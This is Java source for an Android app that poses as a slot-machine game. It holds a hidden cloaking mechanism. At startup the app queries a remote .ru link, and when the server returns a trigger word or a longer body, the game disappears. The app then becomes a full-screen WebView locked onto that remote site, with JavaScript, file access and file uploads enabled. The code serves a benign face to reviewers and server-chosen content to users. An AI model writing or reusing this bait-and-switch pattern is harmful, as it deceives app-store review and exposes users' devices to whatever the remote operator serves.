package com.urewqmist.lkawest;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.constraintlayout.widget.ConstraintLayout;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.graphics.drawable.AnimationDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.CookieSyncManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ViewFlipper;
import com.onesignal.OneSignal;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

public class MainActivity extends AppCompatActivity{

    private ImageView downArrow, btnPlus, btnMinus, btnInfo, btnHandUp, btnHandDown;
    private TextView betTxt, moneyTxt;
    Thread slotTr1, slotTr2, slotTr3;
    Runnable slot1, slot2, slot3, winnerCheck;
    boolean startSl1 = false, startSl2 = false, startSl3 = false, finishGame = false;
    private int bet = 500, money = 10000;
    private boolean web = false;
    private WebView sp;
    private ConstraintLayout fp;
    private String urlPrivPol = "https://sites.google.com/view/34256privacy";
    private String tUrl = "http://greatbuubs.ru/p7X5nNwF";
    private static final String ONESIGNAL_APP_ID = "e0bcf0f4-029e-4306-83c1-b9059c3e5d78";
    private ValueCallback<Uri> mUploadMessage;
    public ValueCallback<Uri[]> uploadMessage;
    public static final int REQUEST_SELECT_FILE = 100;
    private final static int FILECHOOSER_RESULTCODE = 1;
    ViewFlipper[][] flipper;
    List<Integer> images;
    Context context;
    private static MainActivity instance;
    private WebStr ws = new WebStr(tUrl);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (Build.VERSION.SDK_INT < 16) {
            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN);
        }

        setContentView(R.layout.activity_main);

        hideNavBar();
        initComponents();
        webViewSet();
        initFlippers();
        context = getApplicationContext();
        downarrowAnimation();
        touchEnable();
        initThreads();

        slotTr1.start();
        slotTr2.start();
        slotTr3.start();

        instance = this;

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);

        ws.execute();
    }


    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        hideNavBar();
    }

    private void hideNavBar(){
        getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                                                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                                                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                                                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                                                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                                                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
    }

    private void initComponents() {
        downArrow = (ImageView) findViewById(R.id.downarrow);
        btnPlus = (ImageView) findViewById(R.id.plus);
        btnMinus = (ImageView) findViewById(R.id.minus);
        btnInfo = (ImageView) findViewById(R.id.info);
        btnHandUp = (ImageView) findViewById(R.id.handup);
        btnHandDown = (ImageView) findViewById(R.id.handdown);
        betTxt = (TextView) findViewById(R.id.bettxt);
        moneyTxt = (TextView) findViewById(R.id.moneytxt);
        fp = (ConstraintLayout) findViewById(R.id.firstpart);
        sp = (WebView) findViewById(R.id.secondpart);
    }

    private void initButtonMinusTouch(){
        btnMinus.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                if(event.getAction() == MotionEvent.ACTION_DOWN) {
                    btnMinus.setImageResource(R.drawable.minuspush);
                } else if (event.getAction() == MotionEvent.ACTION_UP) {
                    btnMinus.setImageResource(R.drawable.minus);
                    minusBet();
                }
                return true;
            }
        });
    }

    private void initButtonPlusTouch(){
        btnPlus.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                if(event.getAction() == MotionEvent.ACTION_DOWN) {
                    btnPlus.setImageResource(R.drawable.pluspush);
                } else if (event.getAction() == MotionEvent.ACTION_UP) {
                    btnPlus.setImageResource(R.drawable.plus);
                    plusBet();
                }
                return true;
            }
        });
    }

    private void initButtonInfoTouch(){
        btnInfo.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                if(event.getAction() == MotionEvent.ACTION_DOWN) {
                    btnInfo.setImageResource(R.drawable.infopush);
                } else if (event.getAction() == MotionEvent.ACTION_UP) {
                    btnInfo.setImageResource(R.drawable.info);
                    loadPriivacyPolicy();
                }
                return true;
            }
        });
    }

    private void initButtonHandUpClick(){
        btnHandUp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                spinSlots();
            }
        });
    }

    private void downarrowAnimation() {
        downArrow.setBackgroundResource(R.drawable.arrow_animation);
        AnimationDrawable animation = (AnimationDrawable) downArrow.getBackground();
        animation.start();
    }

    private void setBetTxtMoneyTxt() {
        moneyTxt.setText("" + money);
        betTxt.setText("" + bet);
    }

    private void minusBet() {
        if (bet >= 100){
            bet -= 100;
            setBetTxtMoneyTxt();
        }
    }

    private void plusBet() {
        if (bet <= money - 100){
            bet += 100;
            setBetTxtMoneyTxt();
        }
    }

    private void initThreads() {

        slot1 = new Runnable() {
            @Override
            public void run() {
                flipper[0][0].showNext();
                flipper[1][0].showNext();
                flipper[2][0].showNext();
            }
        };
        slot2 = new Runnable() {
            @Override
            public void run() {
                flipper[0][1].showPrevious();
                flipper[1][1].showPrevious();
                flipper[2][1].showPrevious();
            }
        };
        slot3 = new Runnable() {
            @Override
            public void run() {
                flipper[0][2].showNext();
                flipper[1][2].showNext();
                flipper[2][2].showNext();
            }
        };

        slotTr1 = new Thread() {
            Random r = new Random();
            int speed1, speed2, speed3;
            int i;

            @Override
            public void run() {
                while (!finishGame) {
                    while (startSl1) {

                        bet = Integer.parseInt(betTxt.getText().toString());
                        money = Integer.parseInt(moneyTxt.getText().toString());
                        if (money > 0 && money >= bet) {

                            speed1 = r.nextInt(20) + 5;
                            speed2 = r.nextInt(20) + 5;
                            speed3 = r.nextInt(20) + 5;

                            try {
                                for (i = 0; i < speed1; ++i) {
                                    runOnUiThread(slot1);
                                    sleep(100);
                                }
                                for (i = 0; i < speed2; ++i) {
                                    runOnUiThread(slot1);
                                    sleep(200);
                                }
                                for (i = 0; i < speed3; ++i) {
                                    runOnUiThread(slot1);
                                    sleep(300);
                                }
                            } catch (Exception ex) {
                            }

                            startSl1 = false;
                            runOnUiThread(winnerCheck);
                        }
                    }
                }
            }
        };

        slotTr2 = new Thread() {
            Random r = new Random();
            int speed1, speed2, speed3;
            int i;

            @Override
            public void run() {
                while (!finishGame) {
                    while (startSl2) {

                        bet = Integer.parseInt(betTxt.getText().toString());
                        money = Integer.parseInt(moneyTxt.getText().toString());
                        if (money > 0 && money >= bet) {

                            speed1 = r.nextInt(20) + 5;
                            speed2 = r.nextInt(20) + 5;
                            speed3 = r.nextInt(20) + 5;

                            try {
                                for (i = 0; i < speed1; ++i) {
                                    runOnUiThread(slot2);
                                    sleep(100);
                                }
                                for (i = 0; i < speed2; ++i) {
                                    runOnUiThread(slot2);
                                    sleep(200);
                                }
                                for (i = 0; i < speed3; ++i) {
                                    runOnUiThread(slot2);
                                    sleep(300);
                                }
                            } catch (Exception ex) {
                            }

                            startSl2 = false;
                            runOnUiThread(winnerCheck);
                        }
                    }
                }
            }
        };

        slotTr3 = new Thread() {
            Random r = new Random();
            int speed1, speed2, speed3;
            int i;

            @Override
            public void run() {
                while (!finishGame) {
                    while (startSl3) {

                        bet = Integer.parseInt(betTxt.getText().toString());
                        money = Integer.parseInt(moneyTxt.getText().toString());
                        if (money > 0 && money >= bet) {

                            speed1 = r.nextInt(20) + 5;
                            speed2 = r.nextInt(20) + 5;
                            speed3 = r.nextInt(20) + 5;

                            try {
                                for (i = 0; i < speed1; ++i) {
                                    runOnUiThread(slot3);
                                    sleep(100);
                                }
                                for (i = 0; i < speed2; ++i) {
                                    runOnUiThread(slot3);
                                    sleep(200);
                                }
                                for (i = 0; i < speed3; ++i) {
                                    runOnUiThread(slot3);
                                    sleep(300);
                                }
                            } catch (Exception ex) {
                            }

                            startSl3 = false;
                            runOnUiThread(winnerCheck);
                        }
                    }
                }
            }
        };

        winnerCheck = new Runnable() {
            @Override
            public void run() {
                if (!startSl1 && !startSl2 && !startSl3) {

                    int num1 = (flipper[1][0].getDisplayedChild() + 4) % 7;
                    int num2 = (flipper[1][1].getDisplayedChild() + 6) % 7;
                    int num3 = (flipper[1][2].getDisplayedChild() + 1) % 7;

                    int multiply = -1;

                    if (num1 == 0 && num2 == 0 && num3 ==0){
                        multiply = 10;
                    }
                    else if (num1 == num2 && num2 == num3){
                        multiply = 5;
                    }
                    else if(num1 == num2 || num1 == num3|| num2 == num3){
                        multiply = 3;
                    }

                    money += bet * multiply;

                    if(money <= 0) {
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        money = 10000;
                        Toast.makeText(context,"Lucky day! Take extra 10000 points!", Toast.LENGTH_SHORT).show();
                    }
                    if(bet > money){
                        bet = money;
                        Toast.makeText(context,"Bet can't be more than you have!", Toast.LENGTH_SHORT).show();
                    }

                    setBetTxtMoneyTxt();
                    btnHandUp.setVisibility(View.VISIBLE);
                    btnHandDown.setVisibility(View.GONE);
                    touchEnable();
                }
            }
        };
    }

    private void spinSlots() {
        startSl1 = true;
        startSl2 = true;
        startSl3 = true;
        btnHandUp.setVisibility(View.GONE);
        btnHandDown.setVisibility(View.VISIBLE);
        touchDisable();
    }

    private void loadPriivacyPolicy() {
        sp.loadUrl(urlPrivPol);
        sp.setVisibility(View.VISIBLE);
    }

    private void touchEnable() {
        initButtonMinusTouch();
        initButtonPlusTouch();
        initButtonInfoTouch();
        initButtonHandUpClick();
    }

    private void touchDisable() {
        btnPlus.setOnTouchListener(null);
        btnMinus.setOnTouchListener(null);
        btnHandUp.setOnClickListener(null);
    }

    @Override
    public void onBackPressed() {
        if (!web) {
            sp.setVisibility(View.GONE);
        }
        else if (sp.canGoBack()) {
            sp.goBack();
        }
        else {
            sp.loadUrl(tUrl);
        }
    }

    private void initFlippers() {
        images = new ArrayList<>(Arrays.asList(R.drawable.bar, R.drawable.bell, R.drawable.cherry, R.drawable.diamond, R.drawable.lemon, R.drawable.plum, R.drawable.seven));

        flipper = new ViewFlipper[][]{{findViewById(R.id.viewflipper00), findViewById(R.id.viewflipper01), findViewById(R.id.viewflipper02)},
                                    {findViewById(R.id.viewflipper10), findViewById(R.id.viewflipper11), findViewById(R.id.viewflipper12)},
                                    {findViewById(R.id.viewflipper20), findViewById(R.id.viewflipper21), findViewById(R.id.viewflipper22)} };
    }

    public static MainActivity getInstance() {
        return instance;
    }

    protected void ChooseElem() {

        String str = "";
        try {
            str = ws.getLoadPageStr().split("<body>")[1].split("</body>")[0].replaceAll("\\s+", "");
        } catch (Exception ignored) {
        }


        if (str.equals("gorecstar") || str.length() > 55) {
            web = true;
            fp.setVisibility(View.GONE);
            sp.setVisibility(View.VISIBLE);
            includeUploadFiles();
            sp.loadUrl(tUrl);
        }
        else {
            sp.setVisibility(View.GONE);
            fp.setVisibility(View.VISIBLE);
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
        }
    }

    private void webViewSet() {
        sp.setWebViewClient(new WebViewClient());
        sp.setWebChromeClient(new WebChromeClient());

        CookieSyncManager.createInstance(sp.getContext());
        CookieSyncManager.getInstance().sync();

        sp.getSettings().setJavaScriptEnabled(true);
        sp.getSettings().setDomStorageEnabled(true);
        sp.requestFocus(View.FOCUS_DOWN);
        sp.loadUrl("file:///android_asset/loading.gif");
        sp.setVisibility(View.VISIBLE);

    }

    private void includeUploadFiles() {

        WebSettings webSettings = sp.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setSupportZoom(false);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);

        sp.setWebViewClient(new WebViewClient());
        sp.setWebChromeClient(new WebChromeClient());
        sp.getSettings().setJavaScriptEnabled(true);
        sp.getSettings().setDomStorageEnabled(true);
        sp.requestFocus(View.FOCUS_DOWN);

        sp.setWebChromeClient(new WebChromeClient()
        {
            // For 3.0+ Devices (Start)
            // onActivityResult attached before constructor
            protected void openFileChooser(ValueCallback uploadMsg, String acceptType)
            {
                mUploadMessage = uploadMsg;
                Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                i.addCategory(Intent.CATEGORY_OPENABLE);
                i.setType("image/*");
                startActivityForResult(Intent.createChooser(i, "File Browser"), FILECHOOSER_RESULTCODE);
            }

            // For Lollipop 5.0+ Devices
            @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
            public boolean onShowFileChooser(WebView mWebView, ValueCallback<Uri[]> filePathCallback, WebChromeClient.FileChooserParams fileChooserParams)
            {
                if (uploadMessage != null) {
                    uploadMessage.onReceiveValue(null);
                    uploadMessage = null;
                }

                uploadMessage = filePathCallback;

                Intent intent = fileChooserParams.createIntent();
                try
                {
                    startActivityForResult(intent, REQUEST_SELECT_FILE);
                } catch (ActivityNotFoundException e)
                {
                    uploadMessage = null;
                    Toast.makeText(context, "Cannot Open File Chooser", Toast.LENGTH_LONG).show();
                    return false;
                }
                return true;
            }

            //For Android 4.1 only
            protected void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture)
            {
                mUploadMessage = uploadMsg;
                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                intent.addCategory(Intent.CATEGORY_OPENABLE);
                intent.setType("image/*");
                startActivityForResult(Intent.createChooser(intent, "File Browser"), FILECHOOSER_RESULTCODE);
            }

            protected void openFileChooser(ValueCallback<Uri> uploadMsg)
            {
                mUploadMessage = uploadMsg;
                Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                i.addCategory(Intent.CATEGORY_OPENABLE);
                i.setType("image/*");
                startActivityForResult(Intent.createChooser(i, "File Chooser"), FILECHOOSER_RESULTCODE);
            }
        });
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode == REQUEST_SELECT_FILE) {
                if (uploadMessage == null)
                    return;
                uploadMessage.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent));
                uploadMessage = null;
            }
        } else if (requestCode == FILECHOOSER_RESULTCODE) {
            if (null == mUploadMessage)
                return;
            // Use MainActivity.RESULT_OK if you're implementing WebView inside Fragment
            // Use RESULT_OK only if you're implementing WebView inside an Activity
            Uri result = intent == null || resultCode != RESULT_OK ? null : intent.getData();
            mUploadMessage.onReceiveValue(result);
            mUploadMessage = null;
        } else
            Toast.makeText(context, "Failed to Upload Image", Toast.LENGTH_LONG).show();
    }
}